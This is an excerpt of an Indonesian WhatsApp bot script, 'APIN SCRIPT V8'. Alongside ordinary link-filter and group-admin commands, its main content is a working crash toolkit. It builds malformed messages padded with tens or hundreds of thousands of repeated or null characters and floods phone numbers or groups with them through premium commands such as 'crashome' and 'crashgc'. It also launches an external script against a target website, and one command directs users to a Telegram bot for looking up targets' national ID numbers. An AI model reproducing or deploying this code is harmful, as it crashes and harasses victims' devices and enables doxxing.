...
await qio.updateProfileStatus(`APIN SCRIPT V8 || ✅ Runtime : ${uptime}`)
...
"title": `🔏🪨Msg ${m.body || m.mtype}`,
"description": `⟠ Alwaysaqioo Tops 々`,
"currencyCode": "IDR",
...
let { key } = await qio.sendMessage(m.chat, {text: 'APIN X-PLOIT'})
...
//anti bad words by Alwaysaqiooo
...
//antilink youtube video by Alwaysaqiooo
...
//antilink youtube channel by Alwaysaqiooo
...
//antilink instagram by Alwaysaqiooo
...
//antilink facebook by Alwaysaqiooo
if (AntiLinkFacebook)
...
//antilink telegram by Alwaysaqiooo
if (AntiLinkTelegram)
...
//antilink tiktok by Alwaysaqiooo
if (AntiLinkTiktok)
...
//antilink twitter by Alwaysaqiooo
if (AntiLinkTwitter)
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ALFIN FARIDH TAUFIQIY ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/19f021daccc1df3b21a9b.jpg" } }, { upload: qio.waUploadToServer }))
      },
      body: {
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `ALFIN FARIDH TAUFIQIY ✅`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "ALFIN FARIDH TAUFIQIY" + "\0".repeat(920000),
  ...
  await qio.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
    ...
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': 'ALFIN FARIDH TAUFIQIY',
            'subtitle': "ALFIN FARIDH TAUFIQIY"
          },
          'body': {
            'text': "ALFIN FARIDH TAUFIQIY"
          },
...
await qio.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
...
await qio.relayMessage(jid, etc.message, { messageId: etc.key.id })
}
...
││✑${prefix}grupmenu
└─────────────────┈ ✈
 │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : ALFIN FARIDH TAUFIQIY
 └─────────────────┈ ✈`
//Button Menu
let freesex = {
viewOnceMessage: {
...
"newsletterName": 'By Alwaysaqioo Wash Here',
"serverMessageId": 1
},
},
"header": {
...
"footer": {
"text": "𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈⚡", "sections": [{ "title": "›Karma is real", "highlight_label": "☠️Perusak Whatsapp", "rows": [{ "header": "›𝙱𝚞𝚐 𝙼𝚎𝚗𝚞", "title": "Whatsapp Bugger", "id": ".attackbug" }, { "header": "›Owner Menu", "title": "Control Bot", "id": ".ownermenu" }, { "header": "›Group Menu", "title": "Control Group", "id": ".grupmenu" }] }] }`
},
{
"name": "cta_url",
...
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\" Whatsapp Developer\",\"url\":\"https://api.whatsapp.com/send/?phone=6281231948641&text&type=phone_number&app_absent=0\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=6281231948641&text&type=phone_number&app_absent=0\"}"
},
{
"name": "cta_url",
...
└─────────────────┈ ✈
 │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : _@Alwaysaqioo_
 │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : _@Wangcap_
 └─────────────────┈ ✈`)
break
...
//=================================================//
case 'sc': case 'script': {
m.reply(`Sc Ini Dibuat Oleh Alwaysaqioo.
...
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=alwaysaqioo&text=${ini_txt}`)
qio.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break
//=================================================//
case "tinyurl": case "shortlink": {
if (!text) return m.reply(`*Example: ${prefix+command} https://instagram.com/Alwaysaqioo_xploit*`)
...
qio.sendButton(from, [{
   ...
   footer: ''
              ...
              exec(`node ./lib/lapekbugih.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          m.reply(`Error: ${error.message}`);
          return;
        }
...
for (let j = 0; j < 1; j++) {
await qio.sendMessage(Pe, {text: `C 2?`}, {quoted:m})
await bakdok(Pe, qiobatosai)
await sendSystemCrashMessage(Pe, qiobatosai)
await sendViewOnceMessages(Pe, qiobatosai)
await penghitaman(Pe, qiobatosai)
await sendExtendedTextMessage(Pe, qiobatosai)
await iponcrash(Pe)
await iponcrash(Pe, qiobatosai)
await ngeloc(Pe, qiobatosai)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, qiobatosai)
await bughomebutton(Pe, qiobatosai)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, qiobugnew)
await sendRepeatedMessages2(Pe, qiobatosai)
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await bakdok(Pe, qiobatosai)
await sendSystemCrashMessage(Pe, qiobatosai)
await sendViewOnceMessages(Pe, qiobatosai)
await penghitaman(Pe, qiobatosai)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { location : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
}
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { document : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { audio : virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await await qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
}
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
await qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
await qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
await qio.sendMessage(Pe, { contact : virgam }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: virgam,  caption: `${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { video: virgam,  caption: `*@AlwaysaqiooBug/<>/@999999999* *@AlwaysaqiooBug/<>/@999999999* ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { video: virgam,  caption: `*@AlwaysaqiooBug/<>/@999999999* *@AlwaysaqiooBug/<>/@999999999* ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { video: virgam,  caption: `*@AlwaysaqiooBug/<>/@999999999* *@AlwaysaqiooBug/<>/@999999999* ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { video: virgam,  caption: `*@AlwaysaqiooBug/<>/@999999999* *@AlwaysaqiooBug/<>/@999999999* ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: `NOOBS ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `NOOBS ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `NOOBS ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `NOOBS ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(m.chat, {text: `3`}, {quoted:m})
await m.reply(`done🥱`)
}
break
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: `@AlwaysaqiooBug/<>/@999999999 @AlwaysaqiooBug/<>/@999999999 ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `@AlwaysaqiooBug/<>/@999999999 @AlwaysaqiooBug/<>/@999999999 ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `@AlwaysaqiooBug/<>/@999999999 @AlwaysaqiooBug/<>/@999999999 ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `@AlwaysaqiooBug/<>/@999999999 @AlwaysaqiooBug/<>/@999999999 ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { image: slayer07,  caption: `𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: slayer07,  caption: `FOLLOW MY INSTAGRAM https://www.instagram.com/coreinpin/ ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: slayer07,  caption: `TELEGRAM : https://t.me/apintrava ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: slayer07,  caption: `SALURAN : https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await await qio.sendMessage(Pe, { document: virgam,  caption: `𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { document: virgam,  caption: `FOLLOW MY INSTAGRAM https://www.instagram.com/coreinpin/ ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { document: virgam,  caption: `TELEGRAM : https://t.me/apintrava ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { document: virgam,  caption: `SALURAN : https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { image: santet,  caption: `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: santet,  caption: `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: santet,  caption: `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, { image: santet,  caption: `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𓅋 ${buttonqio}` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
case 'sqlpin': case 'gaskenqio': case '☠️': case '🗿': case '⚡': case '😂': case '😈': case '🩸': case '😳': case '🥶': case '💦': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: `𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `FOLLOW MY INSTAGRAM https://www.instagram.com/coreinpin/ ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `TELEGRAM : https://t.me/apintrava ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `SALURAN : https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16 ${buttonqio}`}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: '𝘠𝘛 𝘈𝘓𝘞𝘈𝘠𝘚𝘈𝘘𝘐𝘖𝘖'}, {quoted:m})
await qio.sendMessage(Pe, {text: '𝘠𝘛 𝘈𝘓𝘞𝘈𝘠𝘚𝘈𝘘𝘐𝘖𝘖'}, {quoted:m})
await qio.sendMessage(Pe, {text: '𝘠𝘛 𝘈𝘓𝘞𝘈𝘠𝘚𝘈𝘘𝘐𝘖𝘖'}, {quoted:m})
await qio.sendMessage(Pe, {text: '𝘠𝘛 𝘈𝘓𝘞𝘈𝘠𝘚𝘈𝘘𝘐𝘖𝘖'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
await qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
await qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
await qio.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
break
//=================================================//
case 'crashome': case 'kelapir': case 'sendgas': case 'crashtotal': case 'anjir': {
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: '𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'TELEGRAM : https://t.me/apintrava'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'FOLLOW MY INSTAGRAM https://www.instagram.com/coreinpin/'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'SALURAN : https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
await qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
break
//=================================================//
case 'qioelitceesgc': case 'crashasu': case 'crashgc': case 'gcspam': case 'buttongc': case 'gcampas': {
if (!isPrem) return qioreply(mess.prem)
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
await qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
await qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
await qio.sendMessage(Pe, {text: '❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵'}, {quoted:m})
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
await sendVariousMessages(Pe, qiobatosai)
await sendLiveLocationMessage(Pe, qiobatosai)
await qio.sendMessage(Pe, { image : virgam }, { quoted:m })
await qio.sendMessage(Pe, { image : virgam }, { quoted:m })
await qio.sendMessage(Pe, { image : virgam }, { quoted:m })
await qio.sendMessage(Pe, { image : virgam }, { quoted:m })
await qio.sendMessage(Pe, {text: `Done c1😂`}, {quoted:m})
...
case 'nikparser':
if (!isDeveloper) return m.reply(`lu bukan dev cok`)
...
case 'getnik':
if (!isDeveloper) return m.reply(`lu bukan dev cok`)
tutor = fs.readFileSync('./lib/image/tutor.mp4')
qio.sendMessage(m.chat, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT`},{quoted: m})
break
//=================================================//
case 'tempban': {
...
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
await qio.groupUpdateSubject(m.chat, '𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈')
await qio.groupUpdateDescription(m.chat, '𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈')
...
await m.reply (`𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈`)
}}}
break
//=================================================//
default:
